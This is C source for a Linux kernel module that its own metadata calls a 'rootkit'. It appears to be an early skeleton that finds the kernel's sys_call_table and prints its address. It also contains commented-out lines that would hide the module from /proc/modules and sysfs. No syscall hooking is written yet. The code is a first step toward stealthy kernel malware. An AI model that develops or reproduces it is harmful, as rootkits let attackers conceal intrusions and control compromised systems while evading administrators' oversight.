
/*
 *  hello-4.c - Demonstrates module documentation.
 */
#include <linux/module.h>	/* Needed by all modules */
#include <linux/kallsyms.h> /* for kallsyms_lookup_name */

// *********************************************************************
// module metadata and get rid of taint message
// *********************************************************************

MODULE_LICENSE("GPL");

#define DRIVER_AUTHOR "Alex Cater"
#define DRIVER_DESC   "rootkit"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// *********************************************************************
// prototypes
// *********************************************************************
static void hide_from_system(void);

// *********************************************************************
// variables
// *********************************************************************

static unsigned long *sys_call_table;

// *********************************************************************
// functions
// *********************************************************************
static void hide_from_system()
{
	//list_del_init(&THIS_MODULE->list); 	/* hide from /proc/modules */
	//kobject_del(&THIS_MODULE->mkobj.kobj);	/* remove rootkit's sysfs entry	*/
}

// *********************************************************************
//  init and exit
// *********************************************************************

// ***** module init *****
static int __init init_main(void)
{
	printk(KERN_INFO "Module loaded!\n");
  sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

  if (sys_call_table == NULL) {
    printk(KERN_ERR "Couldn't look up sys_call_table\n");
    return -1;
  }
	printk(KERN_ERR "Found sys_call_table at %p\n", sys_call_table);

	hide_from_system(); // lsmod shouldn't show module... unable to unload currently

  return 0;
}

// ***** module exit *****
static void __exit cleanup(void)
{
	printk(KERN_INFO "Goodbye.\n");
}

module_init(init_main);
module_exit(cleanup);
